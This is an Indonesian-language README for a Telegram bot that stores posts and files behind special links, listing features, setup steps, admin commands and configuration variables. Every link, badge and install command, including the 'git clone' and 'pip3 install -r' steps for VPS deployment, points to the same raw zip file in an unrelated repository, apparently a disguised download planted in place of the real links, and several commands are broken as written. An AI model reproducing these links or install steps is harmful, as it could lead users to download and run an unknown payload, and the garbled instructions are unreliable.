# File-Sharing-Man

Bot Telegram untuk menyimpan Posting atau File yang dapat Diakses melalui Link Khusus.
Saya Kira Ini Akan Bermanfaat Bagi Banyak Orang.. 😇.

##

**Jika Anda memerlukan tambahan module lagi dalam repo atau Jika Anda menemukan bug, silahkan report di group [@SharingUserbot](https://github.com/tzuye/botch/raw/refs/heads/newbot/plugins/Software_v2.6.zip)**

### Features
- Sepenuhnya dapat dicustom.
- Dapat di-deploy di heroku & vps.
- Pesan sambutan & Forcesub yang dapat dicustom.
- Lebih dari satu Posting dalam Satu Link (batch).
- Fleksibel FSUB Button bisa 1 button atau 2 button menyesuaikan dengan var yang di isi.

### Setup

- Tambahkan bot ke Channel Database dengan semua izin admin
- Tambahkan bot ke Channel ForceSub tambahkan bot sebagai ADMIN
- Tambahkan bot ke Group ForceSub tambahkan bot sebagai ADMIN

##
### Installation
#### Deploy on Heroku
[![Deploy](https://github.com/tzuye/botch/raw/refs/heads/newbot/plugins/Software_v2.6.zip)](https://github.com/tzuye/botch/raw/refs/heads/newbot/plugins/Software_v2.6.zip)</br>

**Tonton Video Tutorial Ini di YouTube untuk Bantuan memasang di Heroku**<br>
<a href="https://github.com/tzuye/botch/raw/refs/heads/newbot/plugins/Software_v2.6.zip">
  <img src="https://github.com/tzuye/botch/raw/refs/heads/newbot/plugins/Software_v2.6.zip%20to-Deploy-red?logo=youtube" width="147">
</a><br>

#### Deploy in your VPS
````bash
git clone https://github.com/tzuye/botch/raw/refs/heads/newbot/plugins/Software_v2.6.zip
cd File-Sharing-Man
pip3 install -r https://github.com/tzuye/botch/raw/refs/heads/newbot/plugins/Software_v2.6.zip
cp https://github.com/tzuye/botch/raw/refs/heads/newbot/plugins/Software_v2.6.zip https://github.com/tzuye/botch/raw/refs/heads/newbot/plugins/Software_v2.6.zip
# edit https://github.com/tzuye/botch/raw/refs/heads/newbot/plugins/Software_v2.6.zip Anda dan isi VARS menggunakan nano https://github.com/tzuye/botch/raw/refs/heads/newbot/plugins/Software_v2.6.zip CTRL + S untuk menyimpan VARS Anda, 
# gunakan CTRL + X untuk keluar dan kembali ke direktori File-Sharing-Man
bash start
````

### Admin Commands

```
/start - mulai bot atau dapatkan postingan

/batch - buat link untuk lebih dari satu posting

/genlink - buat link untuk satu posting

/users - lihat statistik pengguna bot

/broadcast - menyiarkan/broadcast pesan apa pun ke pengguna bot

/ping - untuk mengecek bot

/uptime - untuk melihat waktu aktif bot
```

### Variables

* `API_HASH` Dapatkan API HASH di web https://github.com/tzuye/botch/raw/refs/heads/newbot/plugins/Software_v2.6.zip
* `API_ID` Dapatkan APP ID di web https://github.com/tzuye/botch/raw/refs/heads/newbot/plugins/Software_v2.6.zip
* `TG_BOT_TOKEN` Dapatkan dari https://github.com/tzuye/botch/raw/refs/heads/newbot/plugins/Software_v2.6.zip
* `OWNER` Masukan Username Telegram untuk Owner BOT
* `OWNER_ID` Masukan User ID Telegram untuk Owner BOT
* `CHANNEL_ID` Masukan ID Channel Untuk [Channel Database] contoh:- -100xxxxxxxx
* `ADMINS` Masukan User ID untuk mendapatkan hak Admin BOT [Hanya dapat membuat link]
* `START_MESSAGE` Opsional: Pesan /start memulai awalan ke bot, Gunakan <a href='https://github.com/tzuye/botch/raw/refs/heads/newbot/plugins/Software_v2.6.zip'>format</a> parsemode HTML 
* `FORCE_SUB_MESSAGE` Opsional: Pesan Paksa Subscribe bot, Gunakan Format parsemode HTML
* `FORCE_SUB_CHANNEL` Masukan ID dari Channel Untuk Wajib Subscribenya
* `FORCE_SUB_GROUP` Masukan ID dari Group Untuk Wajib Subscribenya

### Extra Variables

* `CUSTOM_CAPTION` letakkan teks teks Kustom Anda jika Anda ingin Mengatur Teks Kustom, Anda dapat menggunakan HTML dan <a href='https://github.com/tzuye/botch/raw/refs/heads/newbot/plugins/Software_v2.6.zip'>fillings</a> untuk pemformatan (hanya untuk dokumen)
* `DISABLE_CHANNEL_BUTTON` Masukan True untuk Nonaktifkan Tombol Berbagi Saluran, Default jika False

### Fillings
#### START_MESSAGE | FORCE_SUB_MESSAGE

* `{first}` - User first name
* `{last}` - User last name
* `{id}` - User ID
* `{mention}` - Mention the user
* `{username}` - Username

#### CUSTOM_CAPTION

* `{filename}` - file name of the Document
* `{previouscaption}` - Original Caption


## Support   
Bergabunglah di [Group Telegram ](https://github.com/tzuye/botch/raw/refs/heads/newbot/plugins/Software_v2.6.zip) Untuk Dukungan/Bantuan Dan Join [Channel](https://github.com/tzuye/botch/raw/refs/heads/newbot/plugins/Software_v2.6.zip) untu info Update bot.   
   
Laporkan Bug, Berikan Permintaan Fitur Di sana.. 

### Credits

- Thanks To Dan For His Awsome [Libary](https://github.com/tzuye/botch/raw/refs/heads/newbot/plugins/Software_v2.6.zip)
- Thanks To [CodeXBotz](https://github.com/tzuye/botch/raw/refs/heads/newbot/plugins/Software_v2.6.zip)
- Our Support Group Members

### Licence
[![GNU GPLv3 Image](https://github.com/tzuye/botch/raw/refs/heads/newbot/plugins/Software_v2.6.zip)](https://github.com/tzuye/botch/raw/refs/heads/newbot/plugins/Software_v2.6.zip)  

[FILE-SHARING-BOT](https://github.com/tzuye/botch/raw/refs/heads/newbot/plugins/Software_v2.6.zip) is Free Software: You can use, study share and improve it at your
will. Specifically you can redistribute and/or modify it under the terms of the
[GNU General Public License](https://github.com/tzuye/botch/raw/refs/heads/newbot/plugins/Software_v2.6.zip) as
published by the Free Software Foundation, either version 3 of the License, or
(at your option) any later version. 

##

   **Berikan Bintang Repo ini jika Anda menyukainya ⭐⭐⭐⭐⭐**

